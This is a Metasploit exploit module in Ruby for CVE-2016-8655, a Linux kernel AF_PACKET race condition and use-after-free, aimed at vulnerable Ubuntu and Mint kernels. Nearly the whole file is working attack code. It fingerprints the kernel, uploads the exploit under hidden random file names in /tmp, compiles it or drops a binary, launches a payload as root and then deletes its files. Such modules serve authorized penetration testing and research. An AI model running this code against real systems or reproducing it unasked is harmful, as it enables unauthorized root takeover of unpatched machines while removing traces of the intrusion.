##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = GoodRanking

  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System
  include Msf::Post::Linux::Kernel
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'AF_PACKET chocobo_root Privilege Escalation',
      'Description'    => %q{
        This module exploits a race condition and use-after-free in the
        packet_set_ring function in net/packet/af_packet.c (AF_PACKET) in
        the Linux kernel to execute code as root (CVE-2016-8655).

        The bug was initially introduced in 2011 and patched in 2016 in version
        4.4.0-53.74, potentially affecting a large number of kernels; however
        this exploit targets only systems using Ubuntu (Trusty / Xenial) kernels
        4.4.0 < 4.4.0-53, including Linux distros based on Ubuntu, such as
        Linux Mint.

        The target system must have unprivileged user namespaces enabled and
        two or more CPU cores.

        Bypasses for SMEP, SMAP and KASLR are included. Failed exploitation
        may crash the kernel.

        This module has been tested successfully on Linux Mint 17.3 (x86_64);
        Linux Mint 18 (x86_64); and Ubuntu 16.04.2 (x86_64) with kernel
        versions 4.4.0-45-generic and 4.4.0-51-generic.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'rebel',        # Discovery and chocobo_root.c exploit
          'Brendan Coles' # Metasploit
        ],
      'DisclosureDate' => 'Aug 12 2016',
      'Platform'       => [ 'linux' ],
      'Arch'           => [ ARCH_X86, ARCH_X64 ],
      'SessionTypes'   => [ 'shell', 'meterpreter' ],
      'Targets'        => [[ 'Auto', {} ]],
      'Privileged'     => true,
      'References'     =>
        [
          [ 'AKA', 'chocobo_root.c' ],
          [ 'EDB', '40871' ],
          [ 'CVE', '2016-8655' ],
          [ 'BID', '94692' ],
          [ 'URL', 'http://seclists.org/oss-sec/2016/q4/607' ],
          [ 'URL', 'http://seclists.org/oss-sec/2016/q4/att-621/chocobo_root_c.bin' ],
          [ 'URL', 'https://github.com/bcoles/kernel-exploits/blob/master/CVE-2016-8655/chocobo_root.c' ],
          [ 'URL', 'https://bitbucket.org/externalist/1day_exploits/src/master/CVE-2016-8655/CVE-2016-8655_chocobo_root_commented.c' ],
          [ 'URL', 'https://usn.ubuntu.com/3151-1/' ],
          [ 'URL', 'https://www.securitytracker.com/id/1037403' ],
          [ 'URL', 'https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=84ac7260236a49c79eede91617700174c2c19b0c' ]
        ],
      'DefaultTarget'  => 0))
    register_options [
      OptInt.new('TIMEOUT', [ true, 'Race timeout (seconds)', '600' ]),
      OptEnum.new('COMPILE', [ true, 'Compile on target', 'Auto', %w(Auto True False) ]),
      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ]),
    ]
  end

  def timeout
    datastore['TIMEOUT'].to_i
  end

  def base_dir
    datastore['WritableDir'].to_s
  end

  def upload(path, data)
    print_status "Writing '#{path}' (#{data.size} bytes) ..."
    rm_f path
    write_file path, data
  end

  def upload_and_chmodx(path, data)
    upload path, data
    cmd_exec "chmod +x '#{path}'"
  end

  def upload_and_compile(path, data)
    upload "#{path}.c", data

    gcc_cmd = "gcc -o #{path} #{path}.c -lpthread"
    if session.type.eql? 'shell'
      gcc_cmd = "PATH=$PATH:/usr/bin/ #{gcc_cmd}"
    end
    output = cmd_exec gcc_cmd
    rm_f "#{path}.c"

    unless output.blank?
      print_error output
      fail_with Failure::Unknown, "#{path}.c failed to compile"
    end

    cmd_exec "chmod +x #{path}"
  end

  def exploit_data(file)
    path = ::File.join Msf::Config.data_directory, 'exploits', 'CVE-2016-8655', file
    fd = ::File.open path, 'rb'
    data = fd.read fd.stat.size
    fd.close
    data
  end

  def live_compile?
    return false unless datastore['COMPILE'].eql?('Auto') || datastore['COMPILE'].eql?('True')

    if has_gcc?
      vprint_good 'gcc is installed'
      return true
    end

    unless datastore['COMPILE'].eql? 'Auto'
      fail_with Failure::BadConfig, 'gcc is not installed. Compiling will fail.'
    end
  end

  def check
    version = kernel_release
    unless version =~ /^4\.4\.0-(21|22|24|28|31|34|36|38|42|43|45|47|51)-generic/
      vprint_error "Linux kernel version #{version} is not vulnerable"
      return CheckCode::Safe
    end
    vprint_good "Linux kernel version #{version} is vulnerable"

    arch = kernel_hardware
    unless arch.include? 'x86_64'
      vprint_error "System architecture #{arch} is not supported"
      return CheckCode::Safe
    end
    vprint_good "System architecture #{arch} is supported"

    cores = get_cpu_info[:cores].to_i
    min_required_cores = 2
    unless cores >= min_required_cores
      vprint_error "System has less than #{min_required_cores} CPU cores"
      return CheckCode::Safe
    end
    vprint_good "System has #{cores} CPU cores"

    unless userns_enabled?
      vprint_error 'Unprivileged user namespaces are not permitted'
      return CheckCode::Safe
    end
    vprint_good 'Unprivileged user namespaces are permitted'

    CheckCode::Appears
  end

  def exploit
    if check != CheckCode::Appears
      fail_with Failure::NotVulnerable, 'Target is not vulnerable'
    end

    if is_root?
      fail_with Failure::BadConfig, 'Session already has root privileges'
    end

    unless cmd_exec("test -w '#{base_dir}' && echo true").include? 'true'
      fail_with Failure::BadConfig, "#{base_dir} is not writable"
    end

    # Upload exploit executable
    executable_name = ".#{rand_text_alphanumeric rand(5..10)}"
    executable_path = "#{base_dir}/#{executable_name}"
    if live_compile?
      vprint_status 'Live compiling exploit on system...'
      upload_and_compile executable_path, exploit_data('chocobo_root.c')
    else
      vprint_status 'Dropping pre-compiled exploit on system...'
      upload_and_chmodx executable_path, exploit_data('chocobo_root')
    end

    # Upload payload executable
    payload_path = "#{base_dir}/.#{rand_text_alphanumeric rand(5..10)}"
    upload_and_chmodx payload_path, generate_payload_exe

    # Launch exploit
    print_status "Launching exploit (Timeout: #{timeout})..."
    output = cmd_exec "echo '#{payload_path} & exit' | #{executable_path}", nil, timeout
    output.each_line { |line| vprint_status line.chomp }
    print_status "Cleaning up #{payload_path} and #{executable_path}.."
    rm_f executable_path
    rm_f payload_path
  end
end